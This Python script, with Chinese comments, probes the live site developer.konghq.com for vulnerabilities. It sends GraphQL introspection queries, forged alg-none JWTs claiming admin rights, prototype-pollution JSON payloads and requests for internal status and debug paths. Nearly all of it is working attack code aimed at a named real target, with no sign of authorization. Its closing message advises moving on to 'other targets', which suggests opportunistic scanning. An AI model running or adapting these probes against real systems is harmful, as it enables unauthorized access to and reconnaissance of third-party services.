#!/usr/bin/env python3
"""
KongHQ 超罕见漏洞测试
1. Web Cache Deception - 登录状态测试（需要Cookie）
2. DOM XSS via postMessage
3. JWT None Algorithm
4. GraphQL Introspection
5. Server-Side Prototype Pollution
6. HTTP Request Smuggling to Internal Services
"""
import requests
import json
from urllib.parse import urljoin

BASE_URL = 'https://developer.konghq.com'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

def test_graphql_introspection():
    """测试GraphQL内省查询"""
    
    print("="*80)
    print("测试1: GraphQL Introspection")
    print("="*80)
    
    # 常见的GraphQL端点
    graphql_endpoints = [
        '/graphql',
        '/api/graphql',
        '/v1/graphql',
        '/query',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    # GraphQL内省查询
    introspection_query = {
        "query": """
        {
          __schema {
            types {
              name
              kind
              description
              fields {
                name
              }
            }
          }
        }
        """
    }
    
    for endpoint in graphql_endpoints:
        print(f"\n[测试] {endpoint}")
        
        try:
            url = BASE_URL + endpoint
            resp = session.post(url, json=introspection_query, timeout=10)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if '__schema' in data:
                        print(f"  🔴 GraphQL内省开启！")
                        types = data['__schema']['types'][:10]
                        print(f"  发现的类型: {[t['name'] for t in types]}")
                        return True
                    else:
                        print(f"  ✅ 返回200但不是GraphQL响应")
                except:
                    print(f"  ✅ 返回200但不是JSON")
            elif resp.status_code == 404:
                print(f"  ✅ 端点不存在")
            elif resp.status_code == 405:
                print(f"  ✅ POST方法不允许")
            else:
                print(f"  ⚠️  状态码: {resp.status_code}")
                
        except Exception as e:
            print(f"  ❌ 错误: {e}")
    
    return False

def test_jwt_none_algorithm():
    """测试JWT None算法攻击"""
    
    print("\n" + "="*80)
    print("测试2: JWT None Algorithm")
    print("="*80)
    
    # 查找可能使用JWT的端点
    jwt_endpoints = [
        '/api/auth',
        '/api/token',
        '/api/login',
        '/auth/verify',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    # 构造None算法的JWT
    import base64
    
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "admin", "role": "admin", "iat": 1234567890}
    
    def base64url_encode(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
    
    none_jwt = f"{base64url_encode(header)}.{base64url_encode(payload)}."
    
    print(f"\n[测试] 使用None算法JWT访问受保护资源")
    print(f"  JWT: {none_jwt[:50]}...")
    
    for endpoint in jwt_endpoints:
        try:
            url = BASE_URL + endpoint
            headers = {'Authorization': f'Bearer {none_jwt}'}
            
            resp = session.get(url, headers=headers, timeout=10)
            
            if resp.status_code == 200:
                print(f"  🔴 {endpoint} 返回200！可能接受了None算法JWT")
                return True
            elif resp.status_code == 401 or resp.status_code == 403:
                print(f"  ✅ {endpoint} 正确拒绝")
            else:
                print(f"  ⚠️  {endpoint} 状态码: {resp.status_code}")
                
        except:
            pass
    
    print("\n✅ 未发现JWT None算法漏洞")
    return False

def test_dom_xss_postmessage():
    """测试DOM XSS via postMessage"""
    
    print("\n" + "="*80)
    print("测试3: DOM XSS via postMessage (静态分析)")
    print("="*80)
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    # 获取首页
    print("\n[分析] 检查postMessage监听器...")
    
    try:
        resp = session.get(BASE_URL, timeout=10)
        content = resp.text
        
        # 查找postMessage相关代码
        import re
        
        # 查找addEventListener('message'
        message_listeners = re.findall(r"addEventListener\s*\(\s*['\"]message['\"]", content)
        
        if message_listeners:
            print(f"  ⚠️  发现 {len(message_listeners)} 个message事件监听器")
            print(f"  需要手动验证是否验证origin")
        else:
            print(f"  ✅ 未发现message事件监听器")
        
        # 查找window.onmessage
        onmessage_handlers = re.findall(r"window\.onmessage\s*=", content)
        
        if onmessage_handlers:
            print(f"  ⚠️  发现 {len(onmessage_handlers)} 个onmessage处理器")
        else:
            print(f"  ✅ 未发现onmessage处理器")
            
    except Exception as e:
        print(f"  ❌ 错误: {e}")

def test_server_side_prototype_pollution():
    """测试服务端原型污染（通过JSON端点）"""
    
    print("\n" + "="*80)
    print("测试4: Server-Side Prototype Pollution")
    print("="*80)
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    # 尝试向可能的JSON端点发送污染payload
    test_endpoints = [
        ('/api/config', 'POST'),
        ('/api/settings', 'POST'),
        ('/api/preferences', 'POST'),
    ]
    
    pollution_payloads = [
        {"__proto__": {"polluted": True}},
        {"constructor": {"prototype": {"polluted": True}}},
        {"filter": {"__proto__": {"test": 123}}},
    ]
    
    for endpoint, method in test_endpoints:
        for payload in pollution_payloads:
            print(f"\n[测试] {method} {endpoint} with {list(payload.keys())[0]}")
            
            try:
                url = BASE_URL + endpoint
                
                if method == 'POST':
                    resp = session.post(url, json=payload, timeout=10)
                else:
                    resp = session.get(url, timeout=10)
                
                # 检查响应
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        # 检查是否被污染
                        if 'polluted' in str(data):
                            print(f"  🔴 响应中包含polluted字段！")
                            return True
                    except:
                        pass
                    
                    print(f"  ⚠️  返回200，但未检测到污染")
                elif resp.status_code == 404:
                    print(f"  ✅ 端点不存在")
                    break  # 跳过这个端点的其他payload
                elif resp.status_code == 405:
                    print(f"  ✅ 方法不允许")
                    break
                else:
                    print(f"  ⚠️  状态码: {resp.status_code}")
                    
            except Exception as e:
                print(f"  ❌ 错误: {e}")
    
    print("\n✅ 未检测到服务端原型污染")
    return False

def test_internal_service_access():
    """测试通过走私访问内部服务"""
    
    print("\n" + "="*80)
    print("测试5: 内部服务访问")
    print("="*80)
    
    # 尝试访问常见的内部服务路径
    internal_paths = [
        '/server-status',
        '/server-info',
        '/status',
        '/info',
        '/metrics',
        '/healthz',
        '/readyz',
        '/debug/vars',
        '/.well-known/',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    found = []
    
    for path in internal_paths:
        try:
            url = BASE_URL + path
            resp = session.get(url, timeout=10, allow_redirects=False)
            
            if resp.status_code == 200:
                # 检查是否是敏感信息
                content_type = resp.headers.get('Content-Type', '')
                
                if 'json' in content_type or 'text/plain' in content_type:
                    print(f"\n🔴 {path} 返回200 ({content_type})")
                    print(f"  响应前200字符: {resp.text[:200]}")
                    found.append(path)
                else:
                    print(f"⚠️  {path} 返回200 (可能是正常页面)")
            elif resp.status_code == 403:
                print(f"⚠️  {path} 返回403（禁止访问，但存在）")
                found.append(path)
            else:
                print(f"✅ {path} → {resp.status_code}")
                
        except Exception as e:
            print(f"❌ {path} → 错误")
    
    if found:
        print(f"\n🔴 发现 {len(found)} 个存在的内部路径:")
        for path in found:
            print(f"  • {path}")
        return True
    
    return False

if __name__ == '__main__':
    print("="*80)
    print(" KongHQ 超罕见漏洞测试")
    print("="*80)
    
    results = []
    
    # 执行测试
    r1 = test_graphql_introspection()
    results.append(('GraphQL Introspection', r1))
    
    r2 = test_jwt_none_algorithm()
    results.append(('JWT None Algorithm', r2))
    
    test_dom_xss_postmessage()
    
    r3 = test_server_side_prototype_pollution()
    results.append(('Server-Side Prototype Pollution', r3))
    
    r4 = test_internal_service_access()
    results.append(('Internal Service Access', r4))
    
    # 总结
    print("\n" + "="*80)
    print(" 📊 测试结果")
    print("="*80)
    
    success = [r for r in results if r[1]]
    
    if success:
        print(f"\n🔴 发现 {len(success)} 个可疑问题:")
        for name, _ in success:
            print(f"  • {name}")
    else:
        print("\n✅ 所有测试均未发现漏洞")
        print("\nKongHQ防护非常完善，建议转向其他目标。")
